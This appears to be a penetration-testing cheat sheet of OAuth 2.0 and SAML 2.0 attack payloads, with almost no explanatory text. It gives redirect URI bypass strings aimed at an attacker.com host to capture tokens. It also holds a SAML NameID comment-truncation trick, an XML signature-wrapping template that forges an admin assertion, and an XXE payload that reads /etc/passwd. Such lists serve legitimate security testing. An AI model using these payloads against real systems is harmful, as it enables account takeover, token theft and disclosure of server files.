---
id: "oauth-saml-payloads"
title: "OAuth 2.0 & SAML 2.0 Payloads"
type: "payloads"
category: "web-application"
tags: ["oauth", "saml", "xsw"]
updated: "2026-04-16"
---

### OAuth 2.0 Redirect URI Bypasses
```text
https://trusted.com@attacker.com
https://trusted.com.attacker.com
https://trusted.com%20@attacker.com
https://trusted.com%09@attacker.com
https://attacker.com?trusted.com
https://trusted.com/callback/../../../../attacker/
https://trusted.com:80@attacker.com/
```

### SAML XML Comment Truncation (NameID)
```xml
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
    admin<!-- -->@victim.com
</saml:NameID>
```

### SAML XML Signature Wrapping (XSW1 Structure)
*(Note: Requires valid base signature block intact)*
```xml
<saml2p:Response>
  <saml2:Assertion ID="Forged_Assertion">
    <saml2:Subject>
      <saml2:NameID>admin@target.com</saml2:NameID>
    </saml2:Subject>
  </saml2:Assertion>
  <ds:Signature>
    <!-- Original Valid Signature Block -->
  </ds:Signature>
  <saml2:Assertion ID="Original_Assertion">
    <!-- Original Data -->
  </saml2:Assertion>
</saml2p:Response>
```

### SAML XXE Injection (Entity Expansion)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml2p:Response>
  <saml2:Issuer>&xxe;</saml2:Issuer>
</saml2p:Response>
```